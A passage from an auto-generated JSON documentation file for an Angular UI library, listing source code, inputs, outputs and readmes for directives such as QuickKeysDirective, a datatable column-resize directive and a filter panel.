                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "e"
                    },
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 3195,
                      "end": 3200,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": ""
                  }
                ]
              },
              {
                "name": "onPaste",
                "args": [
                  {
                    "name": "e",
                    "type": "Event",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "clipboardData",
                    "type": "DataTransfer | null",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 63,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nListens for the paste events.\nHandles spaces, long dash, period and commas.\nTries to the format, will be ignored if something fails.\n",
                "description": "<p>Listens for the paste events.\nHandles spaces, long dash, period and commas.\nTries to the format, will be ignored if something fails.</p>\n",
                "decorators": [
                  {
                    "name": "HostListener",
                    "stringifiedArguments": "'paste', ['$event', '$event.clipboardData']"
                  }
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 1436,
                      "end": 1437,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "e"
                    },
                    "type": "Event",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 1430,
                      "end": 1435,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": "<p>event</p>\n"
                  },
                  {
                    "name": {
                      "pos": 1457,
                      "end": 1470,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "clipboardData"
                    },
                    "type": "DataTransfer | null",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 1451,
                      "end": 1456,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": ""
                  }
                ]
              },
              {
                "name": "setDisplayValue",
                "args": [
                  {
                    "name": "readonly",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 44,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  123
                ],
                "jsdoctags": [
                  {
                    "name": "readonly",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
            "constructorObj": {
              "name": "constructor",
              "description": "",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "elementRef",
                  "type": "ElementRef",
                  "deprecated": false,
                  "deprecationMessage": ""
                },
                {
                  "name": "numberFormatPipe",
                  "type": "NumberInputPipe",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "line": 35,
              "jsdoctags": [
                {
                  "name": "elementRef",
                  "type": "ElementRef",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                },
                {
                  "name": "numberFormatPipe",
                  "type": "NumberInputPipe",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            }
      },
      {
        "name": "QuickKeysDirective",
        "id": "directive-QuickKeysDirective-f0413fb76ee2f4e1e2e506a7778af8ad53c70a8e96bb9e5a876c58e149c263aae890aab572dc379c047f2f3ef63a55de06e0c95da0ef67985b6e744c96621af4",
        "file": "libs/core/src/lib/sto-directives/quick-keys.directive.ts",
        "type": "directive",
        "description": "<p>QuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape</p>\n<form quickKeys (quickSubmit)=\"save()\" (quickCancel)=\"reset()\">\n",
        "rawdescription": "\n\nQuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape\n<form quickKeys (quickSubmit)=\"save()\" (quickCancel)=\"reset()\">\n",
        "sourceCode": "import { Directive, EventEmitter, HostListener, Input, Output } from '@angular/core';\r\nimport { FormGroup } from '@angular/forms';\r\nimport { Key } from '../abstract-and-interfaces/keyPress.enum';\r\n\r\n/**\r\n * QuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape\r\n * <form quickKeys (quickSubmit)=\"save()\" (quickCancel)=\"reset()\">\r\n */\r\n\r\n@Directive({\r\n  selector: '[stoQuickKeys]'\r\n})\r\nexport class QuickKeysDirective {\r\n  @Input() quickKeys: unknown;\r\n  /**\r\n   * Optional formGroup input, when used in combination with a reactive form\r\n   */\r\n  @Input() formGroup: FormGroup;\r\n  /**\r\n   * Emits when ctrl + enter is clicked in combination\r\n   * <form (quickSubmit)=\"save()\">\r\n   */\r\n  @Output() quickSubmit = new EventEmitter<void>();\r\n  /**\r\n   * Emits when escape is clicked\r\n   * <form (quickCancel)=\"cancel()\">\r\n   */\r\n  @Output() quickCancel = new EventEmitter<void>();\r\n\r\n  /**\r\n   * Listens on the host element for any keyup events\r\n   * @param e\r\n   */\r\n  @HostListener('keyup', ['$event'])\r\n  onKeyUp(e: KeyboardEvent) {\r\n    if (this.formGroup) {\r\n      this.handleFormKeys(e);\r\n    }\r\n    this.handleGenericKeydown(e);\r\n  }\r\n\r\n  /**\r\n   * Handler for generic keydowns, such as cancel events to close drawers\r\n   * @param e\r\n   * void\r\n   */\r\n  private handleGenericKeydown(e: KeyboardEvent) {\r\n    // Shortcuts that are useful outside of forms\r\n    if (e.keyCode === Key.Escape) {\r\n      this.quickCancel.emit();\r\n    }\r\n    if (!this.formGroup && e.keyCode === Key.Enter && e.ctrlKey) {\r\n      this.quickSubmit.emit();\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Handler for form specific shortcuts, such as saving the form\r\n   * @param e\r\n   */\r\n  private handleFormKeys(e: KeyboardEvent) {\r\n    if (this.formGroup.pristine) {\r\n      return;\r\n    }\r\n    if (e.keyCode === Key.Enter && e.ctrlKey) {\r\n      this.quickSubmit.emit();\r\n    }\r\n  }\r\n}\r\n",
        "selector": "[stoQuickKeys]",
        "providers": [],
        "inputsClass": [
          {
            "name": "formGroup",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nOptional formGroup input, when used in combination with a reactive form\n",
            "description": "<p>Optional formGroup input, when used in combination with a reactive form</p>\n",
            "line": 18,
            "type": "FormGroup",
            "decorators": []
          },
          {
            "name": "quickKeys",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 14,
            "type": "",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "quickCancel",
            "defaultValue": "new EventEmitter<void>()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEmits when escape is clicked\n<form (quickCancel)=\"cancel()\">\n",
            "description": "<p>Emits when escape is clicked</p>\n<form (quickCancel)=\"cancel()\">\n",
            "line": 28,
            "type": "EventEmitter"
          },
          {
            "name": "quickSubmit",
            "defaultValue": "new EventEmitter<void>()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEmits when ctrl + enter is clicked in combination\n<form (quickSubmit)=\"save()\">\n",
            "description": "<p>Emits when ctrl + enter is clicked in combination</p>\n<form (quickSubmit)=\"save()\">\n",
            "line": 23,
            "type": "EventEmitter"
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [
          {
            "name": "keyup",
            "args": [
              {
                "name": "e",
                "type": "KeyboardEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "argsDecorator": [
              "$event"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nListens on the host element for any keyup events\n",
            "description": "<p>Listens on the host element for any keyup events</p>\n",
            "jsdoctags": [
              {
                "pos": 1009,
                "end": 1022,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 338,
                "tagName": {
                  "pos": 1010,
                  "end": 1015,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": "",
                "name": {
                  "pos": 1016,
                  "end": 1017,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "e"
                },
                "isNameFirst": true,
                "isBracketed": false
              }
            ],
            "line": 35
          }
        ],
        "propertiesClass": [],
        "methodsClass": [
          {
            "name": "handleFormKeys",
            "args": [
              {
                "name": "e",
                "type": "KeyboardEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 61,
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nHandler for form specific shortcuts, such as saving the form\n",
            "description": "<p>Handler for form specific shortcuts, such as saving the form</p>\n",
            "modifierKind": [
              121
            ],
            "jsdoctags": [
              {
                "name": {
                  "pos": 1696,
                  "end": 1697,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "e"
                },
                "type": "KeyboardEvent",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "pos": 1690,
                  "end": 1695,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": ""
              }
            ]
          },
          {
            "name": "handleGenericKeydown",
            "args": [
              {
                "name": "e",
                "type": "KeyboardEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 47,
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nHandler for generic keydowns, such as cancel events to close drawers\nvoid\n",
            "description": "<p>Handler for generic keydowns, such as cancel events to close drawers\nvoid</p>\n",
            "modifierKind": [
              121
            ],
            "jsdoctags": [
              {
                "name": {
                  "pos": 1296,
                  "end": 1297,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "e"
                },
                "type": "KeyboardEvent",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "pos": 1290,
                  "end": 1295,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": "<p>void</p>\n"
              }
            ]
          },
          {
            "name": "onKeyUp",
            "args": [
              {
                "name": "e",
                "type": "KeyboardEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 35,
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nListens on the host element for any keyup events\n",
            "description": "<p>Listens on the host element for any keyup events</p>\n",
            "decorators": [
              {
                "name": "HostListener",
                "stringifiedArguments": "'keyup', ['$event']"
              }
            ],
            "jsdoctags": [
              {
                "name": {
                  "pos": 1016,
                  "end": 1017,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "e"
                },
                "type": "KeyboardEvent",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "pos": 1010,
                  "end": 1015,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": ""
              }
            ]
          }
        ],
        "readme": "<h4 id=\"quickkeysdirective\">QuickKeysDirective</h4>\n<p>QuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape</p>\n<h5 id=\"general-usage\">General usage</h5>\n<p>Currently we support two quick-key actions:</p>\n<ul>\n<li>CTRL+Enter to save</li>\n<li>Escape to cancel</li>\n</ul>\n<p>These emit on (quickSubmit) and (quickCancel) respectively.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;form [formGroup]=&quot;form&quot; quickKeys \n    (quickSubmit)=&quot;save()&quot;\n    (quickCancel)=&quot;cancel()&quot;&gt;...&lt;/form&gt;</code></pre></div><h5 id=\"with-a-formgroup\">With a FormGroup</h5>\n<p>The quick keys can be connected to a FormGroup, which allows us to run some default business checks before emitting (check if form is pristine before emitting submit, for example)</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;form [formGroup]=&quot;form&quot; quickKeys (quickSubmit)=&quot;save()&quot;&gt;...&lt;/form&gt;</code></pre></div>"
      },
      {
        "name": "StoDatatableResizeDirective",
        "id": "directive-StoDatatableResizeDirective-dac223148b60de23f306f3dc4a44c3e85b90e6a5be6e43a253943e24a0cb566a342842873211deaa15126915c24233f725ad1b71ca2298aee1f4c1f98ee5ef36",
        "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-resize.directive.ts",
        "type": "directive",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { AfterViewInit, Directive, ElementRef, EventEmitter, HostListener, Input, OnDestroy, Output } from '@angular/core';\r\nimport { Column } from '../columns';\r\nimport { fromEvent, ReplaySubject, Subject, Subscription } from 'rxjs';\r\nimport { take, takeUntil } from 'rxjs/operators';\r\n\r\n@Directive({\r\n  selector: '[stoDatatableResize]',\r\n  exportAs: 'stoDatatableResize'\r\n})\r\nexport class StoDatatableResizeDirective implements AfterViewInit, OnDestroy {\r\n  @Input()\r\n  column: Column;\r\n  // eslint-disable-next-line @angular-eslint/no-output-native\r\n  @Output()\r\n  // eslint-disable-next-line @angular-eslint/no-output-native\r\n  resize = new EventEmitter<number>();\r\n  @Output()\r\n  resizeEnd = new EventEmitter<number>();\r\n  // @HostBinding('draggable')\r\n  // draggable = true;\r\n  private startOffset: number;\r\n  private initial: number;\r\n  private sub: Subscription;\r\n  public width$ = new ReplaySubject<number | null>();\r\n  private width: number;\r\n  private moveComplete$ = new Subject<boolean>();\r\n\r\n\r\n  constructor(private el: ElementRef<HTMLElement>) {\r\n  }\r\n\r\n  @HostListener('mousedown', [ '$event' ])\r\n  onMouseDown(event: MouseEvent) {\r\n    event.stopPropagation();\r\n    this.startOffset = event.screenX;\r\n    this.initial = this.column.flexBasis || 80;\r\n    fromEvent<MouseEvent>(document, 'mouseup')\r\n      .pipe(take(1))\r\n      .subscribe((ev) => this.onMouseUp(ev));\r\n    fromEvent<MouseEvent>(document, 'mousemove')\r\n      .pipe(takeUntil(this.moveComplete$))\r\n      .subscribe((ev) => this.move(ev));\r\n  }\r\n\r\n  onMouseUp(event: MouseEvent) {\r\n      event.stopPropagation();\r\n      this.moveComplete$.next(true);\r\n      this.width$.next(null);\r\n      this.resizeEnd.emit(this.width);\r\n  }\r\n\r\n  @HostListener('contextmenu', [ '$event' ])\r\n  ctxMenu(event: MouseEvent) {\r\n    event.stopPropagation();\r\n  }\r\n\r\n  private move(event: MouseEvent) {\r\n    const move = event.screenX - this.startOffset;\r\n    const width = this.initial + move < 40 ? 40 : this.initial + move;\r\n    this.width$.next(width);\r\n    this.width = width;\r\n  }\r\n\r\n  ngAfterViewInit(): void {\r\n    this.el.nativeElement.classList.add('sto-mdl-table__header__row__cell__resize-handle');\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    this.moveComplete$.next(true);\r\n    this.moveComplete$.complete();\r\n    this.width$.complete();\r\n  }\r\n\r\n}\r\n",
        "selector": "[stoDatatableResize]",
        "providers": [],
        "inputsClass": [
          {
            "name": "column",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 12,
            "type": "Column",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "resize",
            "defaultValue": "new EventEmitter<number>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 16,
            "type": "EventEmitter"
          },
          {
            "name": "resizeEnd",
            "defaultValue": "new EventEmitter<number>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 18,
            "type": "EventEmitter"
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [
          {
            "name": "contextmenu",
            "args": [
              {
                "name": "event",
                "type": "MouseEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "argsDecorator": [
              "$event"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 53
          },
          {
            "name": "mousedown",
            "args": [
              {
                "name": "event",
                "type": "MouseEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "argsDecorator": [
              "$event"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 33
          }
        ],
        "propertiesClass": [
          {
            "name": "initial",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": false,
            "description": "",
            "line": 22,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "moveComplete$",
            "defaultValue": "new Subject<boolean>()",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 26,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "startOffset",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": false,
            "description": "",
            "line": 21,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "sub",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Subscription",
            "optional": false,
            "description": "",
            "line": 23,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "width",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": false,
            "description": "",
            "line": 25,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "width$",
            "defaultValue": "new ReplaySubject<number | null>()",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 24,
            "modifierKind": [
              123
            ]
          }
        ],
            "methodsClass": [
              {
                "name": "ctxMenu",
                "args": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 53,
                "deprecated": false,
                "deprecationMessage": "",
                "decorators": [
                  {
                    "name": "HostListener",
                    "stringifiedArguments": "'contextmenu', ['$event']"
                  }
                ],
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "move",
                "args": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 57,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "ngAfterViewInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 64,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnDestroy",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 68,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "onMouseDown",
                "args": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 33,
                "deprecated": false,
                "deprecationMessage": "",
                "decorators": [
                  {
                    "name": "HostListener",
                    "stringifiedArguments": "'mousedown', ['$event']"
                  }
                ],
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "onMouseUp",
                "args": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 45,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
            "implements": [
                "AfterViewInit",
                "OnDestroy"
            ],
            "constructorObj": {
              "name": "constructor",
              "description": "",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "el",
                  "type": "ElementRef<HTMLElement>",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "line": 26,
              "jsdoctags": [
                {
                  "name": "el",
                  "type": "ElementRef<HTMLElement>",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            }
      },
      {
        "name": "StoFilterActions",
        "id": "directive-StoFilterActions-b92d3ebb7c61d83c15cb525cadb87804be4d4b07d05d3fd85c3ff27273809d1e3d6be095b8cd41e00f344934d3f95e15f0ca75e111d0f095dff0a668c717f2b8",
        "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
        "type": "directive",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  ChangeDetectorRef,\r\n  Component,\r\n  Directive,\r\n  EventEmitter,\r\n  HostBinding,\r\n  Input,\r\n  OnInit,\r\n  Output,\r\n  ViewChild,\r\n  ViewContainerRef,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { FilterForm, FilterList } from './filter';\r\n\r\n/**\r\n * Sto filter panel is an extension of mat-accordion\r\n */\r\n@Component({\r\n  selector: 'sto-filter-panel',\r\n  templateUrl: './sto-filter-panel.component.html',\r\n  encapsulation: ViewEncapsulation.None,\r\n  styleUrls: [ './sto-filter-panel.component.scss' ]\r\n})\r\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\r\n  set contentHeight(contentHeight: number) {\r\n    this._contentHeight = contentHeight;\r\n  }\r\n\r\n  get contentHeight(): number {\r\n    return this._contentHeight;\r\n  }\r\n\r\n  /**\r\n   * If the filter panel should be expandable. Default true.\r\n   */\r\n  @Input()\r\n  expandable = true;\r\n\r\n  /**\r\n   * If the filter panel should be expanded by default. Default false.\r\n   */\r\n  @Input()\r\n  expanded: boolean;\r\n\r\n  /**\r\n   * List of active filters.\r\n   */\r\n  @Input()\r\n  filterList: FilterList[];\r\n\r\n  /**\r\n   * Emits {isExpanded: boolean, contentHeight: number } where\r\n   * isExpanded is true if the panel opens and false if not.\r\n   * ContentHeight is the height of the expanded content i pixels.\r\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\r\n   */\r\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\r\n  /**\r\n   * Emits when a filter should be cleared (if applicable)\r\n   */\r\n  @Output()\r\n  clearFilter = new EventEmitter();\r\n\r\n  /**\r\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\r\n   */\r\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\r\n  /**\r\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\r\n   */\r\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\r\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\r\n\r\n  @Input()\r\n  public host: FilterForm<Record<string, unknown>>;\r\n  private _contentHeight: number;\r\n\r\n  public hasSeperator = false;\r\n\r\n  constructor(\r\n    private cdr: ChangeDetectorRef,\r\n    private vcRef: ViewContainerRef) {\r\n    try {\r\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\r\n      this.host = ( this.vcRef as any )._view.context;\r\n    } catch ( ex ) {\r\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\r\n    }\r\n  }\r\n\r\n  public toggle() {\r\n    this.expanded = !this.expanded;\r\n    this.setContentHeight();\r\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\r\n  }\r\n\r\n  ngOnInit() {\r\n    if ( this.expandable ) {\r\n      if ( this.expanded === undefined ) {\r\n        this.expanded = true;\r\n      }\r\n    } else {\r\n      this.expanded = false;\r\n    }\r\n\r\n    this.needSeperator();\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    this.needSeperator();\r\n    this.setContentHeight();\r\n  }\r\n\r\n  private setContentHeight() {\r\n    const element = this.filterForm.nativeElement;\r\n    if ( element ) {\r\n      const contentArea = element.parentElement;\r\n      this.contentHeight = contentArea?.offsetHeight || 0;\r\n    }\r\n  }\r\n\r\n  public needSeperator() {\r\n    this.hasSeperator = false;\r\n    if ( this.contentWrapper && this.contentWrapper2 ) {\r\n      const el1 = this.contentWrapper.nativeElement;\r\n      const el2 = this.contentWrapper2.nativeElement;\r\n      if ( el1.children && el2.children ) {\r\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\r\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\r\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\r\n\r\n          this.hasSeperator = hasActionButtons && hasTableButtons;\r\n          this.cdr.detectChanges();\r\n        }\r\n      }\r\n    }\r\n\r\n\r\n  }\r\n\r\n  _clearFilter(key: string, index?: number) {\r\n    if (index === null) {\r\n      return;\r\n    }\r\n    try {\r\n      this.host.clearFilter(key, index);\r\n    } catch {\r\n      this.clearFilter.emit({ key, index });\r\n    }\r\n  }\r\n}\r\n\r\n/**\r\n * <mat-panel-description> directive.\r\n *\r\n * This direction is to be used inside of the MdExpansionPanelHeader component.\r\n */\r\n@Directive({\r\n  // eslint-disable-next-line @angular-eslint/directive-selector\r\n  selector: 'sto-filter-title'\r\n})\r\nexport class StoFilterTitle {\r\n}\r\n\r\n\r\n@Directive({\r\n  selector: 'sto-filter-table-actions'\r\n})\r\nexport class StoFilterTableActions {\r\n  @HostBinding('class.sto-filter-table-actions')\r\n  className = true;\r\n}\r\n\r\n@Directive({\r\n  selector: 'sto-filter-actions'\r\n})\r\nexport class StoFilterActions {\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-filter-actions-bar',\r\n  template: `\r\n    <ng-content></ng-content>\r\n    <button mat-icon-button\r\n            class=\"toggle-expand-button\"\r\n            *ngIf=\"expandable\"\r\n            title=\"Toggle filter panel\"\r\n            (click)=\"toggle.emit()\">\r\n      <mat-icon>filter_list</mat-icon>\r\n    </button>\r\n\r\n  `\r\n})\r\n// eslint-disable-next-line @angular-eslint/component-class-suffix\r\nexport class StoFilterActionsBar {\r\n  @HostBinding('class.sto-filter-actions')\r\n  hasClass = true;\r\n\r\n  @Input() set expanded(expanded: boolean) {\r\n    this._expanded = expanded;\r\n  }\r\n\r\n  get expanded(): boolean {\r\n    return this._expanded;\r\n  }\r\n\r\n  @Input() expandable: boolean;\r\n  private _expanded: boolean;\r\n\r\n  @Output() toggle = new EventEmitter<void>();\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\r\n  onChange(event: unknown) {\r\n    // console.log($event);\r\n  }\r\n\r\n\r\n}\r\n\r\n",
        "selector": "sto-filter-actions",
        "providers": [],
        "inputsClass": [],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "propertiesClass": [],
        "methodsClass": [],
        "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } 